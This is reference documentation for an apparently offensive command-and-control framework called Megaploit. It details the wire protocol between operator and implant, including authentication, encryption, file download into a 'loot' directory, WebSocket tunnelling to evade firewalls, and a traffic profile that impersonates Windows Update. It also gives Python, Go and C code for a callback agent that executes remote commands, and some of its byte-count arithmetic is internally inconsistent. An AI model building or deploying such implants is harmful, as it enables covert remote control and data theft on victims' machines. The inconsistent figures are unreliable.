# Megaploit — Networking & Communication Stack

> **Canonical reference for every layer between the operator console and a running agent.**
> File references point to the implementation so this document stays grounded.

---

## TL;DR

Everything that travels between the operator and an agent passes through these steps in order:

```
TCP connect
  └─► (optional) TLS 1.2+ — ECDHE+AESGCM / ECDHE+CHACHA20 only
        └─► HMAC-SHA256 challenge/response  (16-byte nonce → 32-byte response)
              └─► 1-byte version handshake  (0x4D = v2 encrypted, 0x00 = v1 plain)
                    └─► per-message framing:
                          [ 4-byte BE length ]
                          [ 12-byte AES-GCM nonce ][ ciphertext ][ 16-byte tag ]
                                └─► inside plaintext:
                                      [ 8-byte BE seq ][ JSON-quoted string ]
```

**Five numbers to memorise if you're writing a client:**

| What | Value |
|---|---|
| Length prefix | 4 bytes, big-endian `uint32` |
| Sequence stamp | 8 bytes, big-endian `uint64`, starts at 1, never repeats |
| AES-GCM nonce | 12 bytes, random, prepends every ciphertext |
| AES-GCM tag | 16 bytes, appended after ciphertext |
| Payload encoding | JSON **string** — `"command"` or `"response"`, never an object |

**Four buffer sizes to `#define` in a C agent:**

| Constant | Size | Purpose |
|---|---|---|
| `TLS_BUF_RECORD` | 16,384 B | RFC 5246 hard cap on any single TLS record |
| `TLS_BUF_SERVER_FLIGHT` | 8,192 B | Server's coalesced handshake burst (cert + key exchange) |
| `C2_APP_BUF` | 65,536 B | Normal post-handshake C2 frames (matches `BUFFER_SIZE`) |
| `MP_MAX_MSG` | 256 MiB | Hard ceiling — reject any frame claiming more than this |

Full details in [`plugins/native_sdk/megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h).

---

## Table of Contents

1. [Architecture overview](#1-architecture-overview)
2. [Layer 0 — TCP socket](#2-layer-0--tcp-socket)
3. [Layer 1 — TLS (optional)](#3-layer-1--tls-optional)
4. [Layer 2 — HMAC-SHA256 authentication](#4-layer-2--hmac-sha256-authentication)
5. [Layer 3 — Protocol version handshake](#5-layer-3--protocol-version-handshake)
6. [Layer 4 — Message framing](#6-layer-4--message-framing)
7. [Layer 5 — AES-256-GCM encryption](#7-layer-5--aes-256-gcm-encryption)
8. [Layer 6 — Sequence numbers & replay protection](#8-layer-6--sequence-numbers--replay-protection)
9. [Layer 7 — JSON message encoding](#9-layer-7--json-message-encoding)
10. [File transfer protocol](#10-file-transfer-protocol)
11. [Chunked file transfer](#11-chunked-file-transfer)
12. [WebSocket transport (WsTransport)](#12-websocket-transport-wstransport)
13. [Malleable C2 profile](#13-malleable-c2-profile)
14. [Listener hardening pipeline](#14-listener-hardening-pipeline)
15. [Connection state lifecycle](#15-connection-state-lifecycle)
16. [Agent reconnect behaviour](#16-agent-reconnect-behaviour)
17. [Complete byte-level trace](#17-complete-byte-level-trace)
18. [Implementing a compatible client](#18-implementing-a-compatible-client)

---

## 1. Architecture overview

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         OPERATOR MACHINE                                 │
│                                                                          │
│   CLI console  ──►  server/commands.py  ──►  core/protocol.send_msg()    │
│                                                      │                   │
│                      server/listener.py  ◄───────────┘                   │
│                      (accept loop,                                       │
│                       hardening pipeline,                                │
│                       Session objects)                                   │
└─────────────────────────────────┬────────────────────────────────────────┘
                                  │  TCP  (optionally TLS)
                                  │  optionally WebSocket-framed
                                  │
┌─────────────────────────────────▼────────────────────────────────────────┐
│                           AGENT MACHINE                                  │
│                                                                          │
│   agent/connection.py  ──►  core/protocol.recv_msg()                     │
│   agent/handlers.py    ◄──  dispatches commands, sends responses         │
└──────────────────────────────────────────────────────────────────────────┘
```

**Layering — bottom to top:**

| Layer | What it does | Source |
|---|---|---|
| 0 TCP | Raw byte stream | OS / stdlib `socket` |
| 1 TLS | Optional encryption at the transport level | `server/listener.py` → `ssl` |
| 2 HMAC auth | Shared-secret challenge/response before any data flows | `core/crypto.py` |
| 3 Version handshake | Negotiate v1 (plaintext) vs v2 (AES-GCM) | `core/protocol.py` |
| 4 Framing | 4-byte length-prefixed messages | `core/protocol.py` |
| 5 AES-256-GCM | Per-message authenticated encryption | `core/protocol.py` |
| 6 Sequence numbers | Replay-attack prevention | `core/protocol.py` |
| 7 JSON encoding | Human-readable command/response payload | `core/protocol.py` |
| WsTransport | Optional HTTP/WebSocket wrapper over layers 0–7 | `core/protocol.py` |
| C2 Profile | Traffic-shaping metadata (headers, jitter, URIs) | `core/profile.py` |

---

## 2. Layer 0 — TCP socket

**Source:** [`megaploit/server/listener.py`](../megaploit/server/listener.py), [`megaploit/core/config.py`](../megaploit/core/config.py)

The server opens a plain TCP listener:

```python
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)  # Linux only
sock.bind((bind_host, port))
sock.listen(10)
```

Each accepted connection gets its own daemon thread immediately so the accept loop is never blocked by a slow handshake:

```python
conn, addr = self._server_sock.accept()
threading.Thread(target=self._handshake, args=(conn, addr), daemon=True).start()
```

**Relevant config constants** ([`core/config.py`](../megaploit/core/config.py)):

| Constant | Default | Meaning |
|---|---|---|
| `AUTH_TIMEOUT` | 10 s | Socket deadline during HMAC auth; prevents connection-hold attacks |
| `BUFFER_SIZE` | 65536 | General socket read buffer — 64 KiB covers the largest post-handshake C2 frame without thrashing the kernel |
| `MAX_PLUGIN_MSG_SIZE` | 268,435,456 (256 MiB) | Hard cap enforced by `_recv_framed`; prevents memory exhaustion from malformed or hostile peers; sized for large plugin output, screenshots, and zip transfers |
| `RECONNECT_DELAY` | 10 s | Agent base reconnect interval |
| `RECONNECT_JITTER` | 5 s | Max random jitter added to reconnect delay |

---

## 3. Layer 1 — TLS (optional)

**Source:** [`megaploit/server/listener.py:267`](../megaploit/server/listener.py) — `build_ssl_context()` / `build_agent_ssl_context()` / `generate_self_signed_cert()`

When TLS is enabled, the raw socket is wrapped with a hardened TLS context **before** any authentication bytes are exchanged:

```python
conn = ssl_context.wrap_socket(raw_conn, server_side=True)
```

**Hardening configuration applied:**

| Option | Value | Effect |
|---|---|---|
| Minimum protocol | TLS 1.2 | Excludes SSLv2, SSLv3, TLS 1.0, TLS 1.1 |
| Cipher suites | `ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20` | AEAD-only; no CBC, no RC4, no export |
| `OP_NO_COMPRESSION` | set | CRIME attack mitigation |
| `OP_CIPHER_SERVER_PREFERENCE` | set | Server picks cipher, not client |
| `OP_SINGLE_DH_USE` + `OP_SINGLE_ECDH_USE` | set | Fresh DH parameters per session (forward secrecy) |
| `OP_NO_RENEGOTIATION` | set (Python ≥ 3.7) | Prevents renegotiation-based attacks |

The agent-side context (`build_agent_ssl_context`) uses `CERT_NONE` + `check_hostname=False` because the server uses a self-signed certificate. TLS 1.2+ and AEAD-only ciphers are still enforced on the agent side.

### Auto-cert (recommended)

Megaploit can generate and manage the TLS certificate itself — no `openssl` command needed:

```bash
# Startup flag — generates loot/tls/megaploit.crt + loot/tls/megaploit.key
python3 server.py -lh 10.0.0.1 -p 4444 --tls

# Or from the console at any time:
megaploit [0] » tls auto     # generate & activate immediately
megaploit [0] » tls status   # cert path + SHA-256 fingerprint
megaploit [0] » tls regen    # force new cert
```

The auto-cert is RSA-2048, valid for 365 days, stored in `loot/tls/`. The SHA-256 fingerprint is printed in the startup config box and reused on subsequent runs. Uses the `cryptography` Python package if installed; falls back to `openssl req` subprocess.

### Manual cert

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem
```

---

## 4. Layer 2 — HMAC-SHA256 authentication

**Source:** [`megaploit/core/crypto.py`](../megaploit/core/crypto.py)

After TLS (or immediately on a plain TCP socket), both sides run a challenge/response exchange using the shared 32-byte secret key.

**Wire sequence:**

```
Server                              Agent
  │                                    │
  │──── 16 random bytes (challenge) ──►│
  │                                    │  HMAC-SHA256(key, challenge)
  │◄─── 32 bytes (HMAC response) ──────│
  │  hmac.compare_digest()             │
  │  drop if mismatch                  │
```

**Server code:**
```python
challenge = os.urandom(16)
conn.sendall(challenge)
resp     = recv_exactly(conn, 32)          # read exactly 32 bytes
expected = hmac.new(key, challenge, sha256).digest()
return hmac.compare_digest(resp, expected) # constant-time compare
```

**Agent code:**
```python
challenge = recv_exactly(conn, 16)
response  = hmac.new(key, challenge, sha256).digest()
conn.sendall(response)
```

**Key facts:**
- `hmac.compare_digest` is used (not `==`) to prevent timing side-channels.
- The auth window is limited to `AUTH_TIMEOUT` (10 s) via a socket deadline; connections that hold open without responding are closed.
- The key is a 32-byte secret loaded from `secret.key` (64 hex chars). On Unix, `crypto.py` warns if file permissions are broader than `0600`.
- A key fingerprint (first 16 hex chars of `SHA-256(key)`) is printed on startup so operators can verify both sides share the same key without revealing it.

---

## 5. Layer 3 — Protocol version handshake

**Source:** [`megaploit/core/protocol.py:172`](../megaploit/core/protocol.py) — `handshake_server()` / `handshake_agent()`

Immediately after a successful HMAC auth, both sides exchange a single byte to negotiate between protocol v1 (legacy, plaintext) and v2 (AES-GCM encrypted).

**Wire sequence:**

```
Server                              Agent
  │                                   │
  │────── 0x4D ('M') ────────────────►│   (v2 capability byte)
  │◄───── echo (1 byte) ──────────────│
  │                                   │
  │  if echo == 0x4D AND key present: │
  │    → activate AES-GCM state       │
  │  else:                            │
  │    → plaintext v1 fallback        │
```

**Magic bytes:**
- `0x4D` = ASCII `'M'` → v2 encrypted
- `0x00` → v1 plaintext fallback

The server writes the magic byte first. The agent reads it and echoes it back verbatim. If both sides see `0x4D` and both have a key, `_ConnState(encrypted=True)` is installed on the socket. Any mismatch (e.g., a legacy agent that doesn't understand v2) causes both sides to fall back to plaintext.

---

## 6. Layer 4 — Message framing

**Source:** [`megaploit/core/protocol.py:358`](../megaploit/core/protocol.py) — `_recv_framed()`, `_recv_exactly()`

Every message — whether a text command, a file, or a file chunk — is wrapped in the same simple length-prefix frame:

```
┌────────────────────────────────────────────────────┐
│  4 bytes  │  uint32 big-endian  │  payload length  │
├────────────────────────────────────────────────────┤
│  N bytes  │  payload            │  (see layers 5–7)│
└────────────────────────────────────────────────────┘
```

**Python struct format:** `"!I"` (`!` = network/big-endian, `I` = unsigned 32-bit int)

`_recv_exactly()` is a strict blocking read that loops until it has consumed exactly N bytes, preventing short-read fragmentation from TCP:

```python
def _recv_exactly(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None   # EOF → connection closed
        buf += chunk
    return buf
```

A zero-length frame (`length == 0`) is legal and returns an empty byte string without reading further.

---

## 7. Layer 5 — AES-256-GCM encryption

**Source:** [`megaploit/core/protocol.py:129`](../megaploit/core/protocol.py) — `_encrypt()`, `_decrypt()`

When v2 is negotiated (layer 3), the **payload** inside every frame is replaced with:

```
┌──────────────────────────────────────────────────────────────────────┐
│  12 bytes  │  GCM nonce (random, os.urandom)                         │
├──────────────────────────────────────────────────────────────────────┤
│  N bytes   │  AES-256-GCM ciphertext                                 │
├──────────────────────────────────────────────────────────────────────┤
│  16 bytes  │  GCM authentication tag                                 │
└──────────────────────────────────────────────────────────────────────┘
```

The nonce is generated fresh for every message with `os.urandom(12)` — never reused.

**Encrypt path:**
```python
nonce = os.urandom(12)
ct    = AESGCM(key).encrypt(nonce, plaintext, None)  # ct includes the 16-byte tag
return nonce + ct                                     # 12 + len(plaintext) + 16 bytes
```

**Decrypt path:**
```python
nonce  = data[:12]
ct_tag = data[12:]
return AESGCM(key).decrypt(nonce, ct_tag, None)      # raises if tag fails
```

**Fallback** (when the `cryptography` package is not installed): the cipher degrades to a deterministic XOR-CTR stream derived from `SHA-256(key ‖ nonce ‖ block_counter)` plus a fake 16-byte zero tag. **This fallback does not provide authentication.** Install `cryptography` (`pip install cryptography`) for real AEAD security.

---

## 8. Layer 6 — Sequence numbers & replay protection

**Source:** [`megaploit/core/protocol.py:64`](../megaploit/core/protocol.py) — `_ConnState`

The **plaintext** of every message (inside the AES-GCM envelope, or raw in v1) always starts with an 8-byte monotonic sequence number:

```
┌──────────────────────────────────────────────────────────────┐
│  8 bytes  │  uint64 big-endian  │  sequence number (1, 2, …) │
├──────────────────────────────────────────────────────────────┤
│  N bytes  │  actual payload (JSON string or raw file bytes)  │
└──────────────────────────────────────────────────────────────┘
```

**Python struct format:** `"!Q"` (big-endian unsigned 64-bit int)

Each side maintains two independent counters per connection:

| Counter | Direction | Starts at | Incremented |
|---|---|---|---|
| `_send_seq` | outgoing | 0 | before every send (first message = 1) |
| `_recv_seq` | incoming | -1 | updated on every accepted message |

**Acceptance rule:** a received sequence number is accepted only if it is strictly greater than `_recv_seq`. Equality or lower values raise `ValueError("Replay detected")`.

```python
def check_recv_seq(self, seq: int) -> bool:
    if seq > self._recv_seq:
        self._recv_seq = seq
        return True
    return False   # replay — drop
```

Both `_send_seq` increments and `_recv_seq` checks are protected by a per-connection `threading.Lock` so concurrent threads sharing a socket do not race.

---

## 9. Layer 7 — JSON message encoding

**Source:** [`megaploit/core/protocol.py:216`](../megaploit/core/protocol.py) — `send_msg()`, `recv_msg()`

The payload bytes after the 8-byte sequence stamp are a UTF-8 encoded **JSON string** — not a JSON object or array, but a JSON-quoted string value:

```
"ls -la /tmp"           ← operator sending a command
"[+] total 8\ndrwxr-xr-x ..."  ← agent sending a response
```

**Send path:**
```python
seq     = state.next_send_seq()                  # increment, get next seq
payload = struct.pack("!Q", seq) + json.dumps(data).encode("utf-8")
# if encrypted: payload = _encrypt(key, payload)
conn.sendall(struct.pack("!I", len(payload)) + payload)
```

**Receive path:**
```python
raw     = _recv_framed(conn)                     # read length + body
# if encrypted: raw = _decrypt(key, raw)
seq     = struct.unpack("!Q", raw[:8])[0]
payload = raw[8:]
check_recv_seq(seq)                              # replay guard
return json.loads(payload.decode("utf-8"))       # returns a Python str
```

`recv_msg` falls back to `payload.decode("utf-8", errors="replace")` without JSON parsing when the payload is not valid JSON — this lets legacy agents that send plain text still work.

---

## 10. File transfer protocol

**Source:** [`megaploit/core/protocol.py:261`](../megaploit/core/protocol.py) — `send_file()`, `recv_file()`

File data is transferred as a **single frame** using the same outer framing (layer 4) and encryption (layer 5), but the payload after the 8-byte sequence stamp is **raw binary** — no JSON encoding:

```
Frame payload:
  [ 8 bytes seq ]  [ raw file bytes ]
```

**Transfer sequence** (example: `download` command):

```
Server (operator)           Agent
       │                       │
       │── "download foo.bin"─►│    (send_msg — JSON string)
       │                       │    agent reads file, prepares to send
       │◄── "FILE_OK" ─────────│    (send_msg — JSON string signal)
       │◄── <framed file> ─────│    (send_file — raw bytes frame)
       │  recv_file() writes   │
       │  to loot/downloads/   │
```

`recv_file()` accepts an optional `timeout` parameter; the socket deadline is set for the duration of the read and restored afterwards.

---

## 11. Chunked file transfer

**Source:** [`megaploit/core/protocol.py:306`](../megaploit/core/protocol.py) — `chunked_send_file()`, `chunked_recv_file()`

For files that are too large to buffer in RAM (default threshold: ~50 MB), the data is split into 1 MiB chunks. Each chunk is its own framed message with a 1-byte continuation flag prepended:

```
Chunk payload:
  [ 8 bytes seq ]  [ 1 byte flag: 0x01=more | 0x00=last ]  [ chunk data ]
```

The receiver loops, writing chunks to disk, until it sees `flag == 0x00`.

```python
# sender
flag = b"\x01" if more_data_follows else b"\x00"
payload = seq_bytes + flag + chunk
send_frame(conn, encrypt_if_needed(payload))

# receiver
while True:
    raw  = recv_framed(conn)
    flag = raw[8:9]
    out.write(raw[9:])
    if flag == b"\x00":
        break
```

---

## 12. WebSocket transport (WsTransport)

**Source:** [`megaploit/core/protocol.py:387`](../megaploit/core/protocol.py) — `class WsTransport`

`WsTransport` is an optional shim that wraps **all layers 4–7** inside RFC 6455 WebSocket binary frames. It is used when agents need to communicate over port 80/443 and blend in with normal browser traffic to bypass DPI firewalls.

### WebSocket handshake

```
Agent                                   Server
  │── GET /ws HTTP/1.1                  ──►│
  │   Upgrade: websocket                   │
  │   Sec-WebSocket-Key: <base64-nonce>    │
  │                                        │
  │◄── HTTP/1.1 101 Switching Protocols ───│
  │    Sec-WebSocket-Accept: <sha1-accept> │
```

The `Sec-WebSocket-Accept` header is `base64(SHA-1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))` per RFC 6455 §4.2.2.

### Frame format (RFC 6455)

```
Byte 0:  FIN(1) RSV(3) Opcode(4)   — always 0x82 (FIN=1, binary opcode=2)
Byte 1:  MASK(1) Payload length(7) — client frames are masked; server frames are not
[2–9]:   Extended length (if length == 126 → 2 bytes; if 127 → 8 bytes)
[mask]:  4-byte masking key (client → server only)
[data]:  Payload (XOR-masked on client frames)
```

After the WebSocket handshake, the existing C2 framing (layers 4–7) runs **inside** WebSocket binary frames unchanged. `WsTransport.send(data)` and `.recv()` are drop-in replacements for `conn.sendall` and `conn.recv` at the socket level.

**Opcode handling:**
- `0x02` (binary) → normal data frame
- `0x09` (ping) → automatically answered with a pong
- `0x08` (close) → raises `ConnectionError`, closes the socket

---

## 13. Malleable C2 profile

**Source:** [`megaploit/core/profile.py`](../megaploit/core/profile.py)

A C2 profile does **not** change the wire protocol. It adds metadata and timing behaviour that shapes how the traffic looks to a network observer:

| Field | Effect |
|---|---|
| `sleep` + `jitter_max` | Agent beacon interval = `sleep + random(0, jitter_max)` seconds |
| `uri_paths` | Agents rotate through these paths on HTTP-mode transports |
| `request_headers` | HTTP headers injected into agent requests (mimic browsers, CDNs, etc.) |
| `response_headers` | HTTP headers returned by the C2 server |
| `user_agent` | Overrides the `User-Agent` header |
| `metadata_prepend/append/location` | How agent identity tokens are embedded in traffic |

**Profile file (YAML):**
```yaml
name: "WindowsUpdate"
sleep: 60
jitter_max: 15
uri_paths:
  - "/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab"
request_headers:
  Host: "update.microsoft.com"
  User-Agent: "Windows-Update-Agent/10.0.10011.16384"
response_headers:
  Server: "Microsoft-IIS/10.0"
```

Load with:
```python
from megaploit.core.profile import load_profile
profile = load_profile("profiles/windows_update.yaml")
time.sleep(profile.sleep_with_jitter())
headers = profile.build_http_headers()
path    = profile.next_uri()
```

---

## 14. Listener hardening pipeline

**Source:** [`megaploit/server/listener.py`](../megaploit/server/listener.py)

Every inbound TCP connection passes through six gates in order. Failure at any gate closes the socket immediately with no response data:

```
TCP accept
    │
    ▼
[1] IP allowlist
    Configured with --allow-ip; if set, any IP not in the list is dropped
    before any data is read.
    │
    ▼
[2] Rate limiter
    Sliding 60-second window per source IP.
    MAX_AUTH_ATTEMPTS_PER_MIN = 5  (default)
    Exceeding the limit → IP banned for IP_BAN_DURATION = 300 s.
    All events written to loot/audit.log.
    │
    ▼
[3] TLS upgrade (optional)
    ssl.wrap_socket() with the hardened server context.
    SSLError → drop.
    │
    ▼
[4] HMAC-SHA256 authentication
    AUTH_TIMEOUT = 10 s socket deadline.
    Any mismatch or timeout → drop + audit log entry.
    │
    ▼
[5] Protocol version handshake
    Negotiate v1 / v2 (AES-GCM).
    │
    ▼
[6] Session created
    Session object handed to on_session() callback.
    Audit log entry: ACCEPTED ip=… session=… cipher=…
```

**Audit log format** (`loot/audit.log`):
```
2024-03-15 14:22:01 UTC  LISTEN  bind=0.0.0.0:4444  tls=yes  allowlist=none
2024-03-15 14:22:45 UTC  ACCEPTED ip=10.0.0.5         port=51234  session=1  cipher=ECDHE-RSA-AES256-GCM-SHA384
2024-03-15 14:23:10 UTC  REJECTED ip=10.0.0.99        port=43210  reason=auth_failed
2024-03-15 14:25:00 UTC  BANNED   ip=10.0.0.99        attempts=6  ban_until=14:30:00
```

---

## 15. Connection state lifecycle

**Source:** [`megaploit/core/protocol.py:64`](../megaploit/core/protocol.py) — `_ConnState`, `get_state()`, `set_state()`, `remove_state()`

Each socket has a `_ConnState` object stored in a module-level dict keyed by the socket file descriptor:

```python
_states: dict[int, _ConnState] = {}   # fd → _ConnState
```

State is created lazily on the first `get_state(conn)` call (defaults to plaintext, seq=0). The version handshake replaces it with a configured state via `set_state()`.

When a session ends (`listener.cleanup_session(conn)`), `remove_state(conn)` deletes the entry to avoid fd reuse collisions.

```
socket accepted
      │
      ▼
get_state() → creates _ConnState(encrypted=False, key=None)
      │
      ▼
handshake_server() → set_state(_ConnState(encrypted=True, key=…))
      │
 [session active — all send/recv use this state]
      │
      ▼
session.close() → remove_state(conn) → entry deleted
```

---

## 16. Agent reconnect behaviour

**Source:** [`megaploit/core/config.py`](../megaploit/core/config.py), [`megaploit/agent/go_agent/main.go:73`](../megaploit/agent/go_agent/main.go)

Agents reconnect automatically after any disconnection. The reconnect delay uses jitter to prevent multiple agents from hammering the server simultaneously after a restart:

```
delay = RECONNECT_DELAY + random(0, RECONNECT_JITTER)
      = 10 s + random(0, 5 s)
      = 10–15 s
```

The Go agent uses a cryptographically random jitter (`crypto/rand`) of 0–5000 ms on top of the 10 s base, then repeats `run()` in a loop:

```go
for {
    run()   // connect, auth, handshake, command loop
    jitter, _ := rand.Int(rand.Reader, big.NewInt(5000))
    time.Sleep(10*time.Second + time.Duration(jitter.Int64())*time.Millisecond)
}
```

---

## 17. Complete byte-level trace

This trace shows every byte exchanged for a single `ls` command over an encrypted (v2) connection. Hex values are shown where relevant.

```
── PHASE 1: TCP connect ────────────────────────────────────────────────────

  Agent → Server: [SYN]
  Server → Agent: [SYN-ACK]
  Agent → Server: [ACK]

── PHASE 2: (optional) TLS handshake ───────────────────────────────────────

  [standard TLS 1.2/1.3 handshake — ~7 round trips, omitted for brevity]

── PHASE 3: HMAC-SHA256 authentication ─────────────────────────────────────

  Server → Agent:  16 bytes  e.g.  a3 f7 02 ... (random challenge)
  Agent  → Server: 32 bytes  HMAC-SHA256(key, challenge)

── PHASE 4: Protocol version handshake ─────────────────────────────────────

  Server → Agent:  1 byte   4D  ('M' = v2)
  Agent  → Server: 1 byte   4D  (echo)
  [Both sides activate AES-GCM state]

── PHASE 5: Operator sends "ls" command ────────────────────────────────────

  Plaintext to encrypt:
    seq (8 bytes, BE):  00 00 00 00 00 00 00 01
    JSON payload:       22 6C 73 22             → "ls"

  AES-256-GCM encrypt(plaintext):
    nonce (12 bytes):   [random]
    ciphertext+tag:     [12 + 2 + 16 = 30 bytes if payload="ls"]

  Frame:
    length (4 bytes BE):  00 00 00 2A           → 42  (12 nonce + 2 ct + 16 tag + 12 = 42)
    payload:              [nonce][ciphertext][tag]

  Wire:  00 00 00 2A [42 bytes]

── PHASE 6: Agent executes, sends response ─────────────────────────────────

  Plaintext to encrypt:
    seq (8 bytes, BE):  00 00 00 00 00 00 00 01
    JSON payload:       "\"total 4\\ndrwxr-xr-x ...\""

  [Same framing as above, larger ciphertext]

── PHASE 7: Server decrypts, displays to operator ──────────────────────────

  recv_msg() → json.loads(payload) → "total 4\ndrwxr-xr-x ..."
```

---

## 18. Implementing a compatible client

Any language (C, C++, C#, Rust, Go, Java) can act as an agent. The exact requirements in implementation order:

### Step 1 — TCP connect
```c
int fd = connect_to(LHOST, PORT);
```

### Step 2 — (optional) TLS
Wrap the socket with TLS 1.2+, AEAD-only ciphers, `verify=false` (self-signed cert on server).

### Step 3 — HMAC-SHA256 auth
```c
uint8_t challenge[16];
recv_exactly(fd, challenge, 16);
uint8_t response[32];
HMAC_SHA256(key, 32, challenge, 16, response);
send(fd, response, 32);
```

### Step 4 — Protocol version handshake
```c
uint8_t ver;
recv_exactly(fd, &ver, 1);
send(fd, &ver, 1);              // echo back verbatim
int use_v2 = (ver == 0x4D);    // 'M'
```

### Step 5 — Initialise sequence counters
```c
uint64_t send_seq = 0;
int64_t  recv_seq = -1;
```

### Step 6 — Command loop
```c
while (1) {
    // receive
    uint8_t hdr[4];
    recv_exactly(fd, hdr, 4);
    uint32_t length = be32(hdr);
    uint8_t *frame  = malloc(length);
    recv_exactly(fd, frame, length);

    // decrypt (if v2)
    uint8_t *plain = v2 ? aes_gcm_decrypt(key, frame, length) : frame;

    // check seq (big-endian uint64 at bytes 0–7)
    uint64_t seq = be64(plain);
    assert(seq > recv_seq);    // replay guard
    recv_seq = seq;

    // extract JSON string (bytes 8+)
    char *cmd = json_unquote(plain + 8);

    // execute
    char *result = handle(cmd);

    // send response
    send_seq++;
    uint8_t out[8 + strlen(result) + 2];  // seq + "result"
    put_be64(out, send_seq);
    memcpy(out + 8, json_quote(result), ...);

    uint8_t *wire = v2 ? aes_gcm_encrypt(key, out, ...) : out;
    uint8_t len_hdr[4];
    put_be32(len_hdr, wire_len);
    send(fd, len_hdr, 4);
    send(fd, wire, wire_len);
}
```

### Common mistakes that cause silent rejection

| Mistake | Symptom |
|---|---|
| Little-endian length or seq | Frame parsing is completely wrong; server reads garbage lengths |
| Sending raw text without seq prefix | `_SEQ.unpack(raw[:8])` reads 8 bytes of your text as a number |
| JSON object/array instead of string | `json.loads()` returns a dict/list; server treats it as a non-string command |
| Reusing a sequence number | `check_recv_seq()` returns False; message is silently dropped |
| Wrong nonce position (after ciphertext) | `_decrypt()` reads the first 12 bytes as nonce → wrong nonce, decryption fails |
| Missing 16-byte GCM tag | `AESGCM.decrypt()` raises `InvalidTag`; server raises `ConnectionError` |
| Not echoing the version byte | Server never activates AES-GCM state; all subsequent frames are sent encrypted but received as plaintext |
| TLS recv buffer too small | Short-read during server handshake flight; `SSL_read` / `recv` returns partial record, frame parser desyncs |

### TLS buffer sizing for a C client

The cipher suite restriction (`ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20`) means every session uses an **ephemeral (EC)DH key exchange** — a fresh keypair is generated per connection, so the handshake includes a `ServerKeyExchange` message carrying the server's ECDHE public key signed with the long-term RSA-4096 cert key. That makes the server's opening flight the largest thing you will ever receive in a single burst.

**Per-message size breakdown:**

| TLS message | Direction | Typical size |
|---|---|---|
| `ClientHello` | Client → Server | 200–350 bytes |
| `ServerHello` | Server → Client | ~80 bytes |
| `Certificate` (RSA-4096 self-signed) | Server → Client | **~1,900 bytes** |
| `ServerKeyExchange` (ECDHE pub key + RSA-4096 signature) | Server → Client | ~350–512 bytes |
| `ServerHelloDone` | Server → Client | 4 bytes |
| `ClientKeyExchange` (ECDHE client pub key) | Client → Server | ~70 bytes |
| `ChangeCipherSpec` + `Finished` | Both directions | ~90 bytes each |

The server may coalesce `ServerHello + Certificate + ServerKeyExchange + ServerHelloDone` into a single TCP segment. That burst peaks at roughly **2,500 bytes**, well within 8 KiB.

**Allocate these buffers in your C agent** (all defined in [`megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h)):

```c
/* TLS handshake buffers */
#define TLS_BUF_RECORD        16384   /* RFC 5246 §6.2.1 hard cap per record          */
#define TLS_BUF_SERVER_FLIGHT  8192   /* server handshake burst: cert + KX + done     */
#define TLS_BUF_CLIENT_HELLO   1024   /* ClientHello with all required extensions      */

/* Post-handshake application buffers */
#define C2_APP_BUF            65536   /* matches config.py:BUFFER_SIZE (64 KiB)        */
#define MP_MAX_MSG    (256*1024*1024) /* matches config.py:MAX_PLUGIN_MSG_SIZE (256 MiB) */
                                      /* reject any frame header larger than this       */
```

If you are using **OpenSSL** (`SSL_connect` / `SSL_read` / `SSL_write`), OpenSSL manages all internal TLS record buffers itself. You only need to size your application-layer read buffer — use `C2_APP_BUF` (65,536) for normal traffic and `MP_MAX_MSG` as the sanity ceiling before allocating a receive buffer for an incoming frame.

If you are calling `recv()` directly on the raw socket and parsing TLS records yourself, `TLS_BUF_SERVER_FLIGHT` (8,192) is sufficient for the largest inbound handshake flight, and `TLS_BUF_RECORD` (16,384) is the safe ceiling for any single TLS record from a conformant peer.

A complete C/C++ single-header implementation of all these layers is available in [`plugins/native_sdk/megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h).
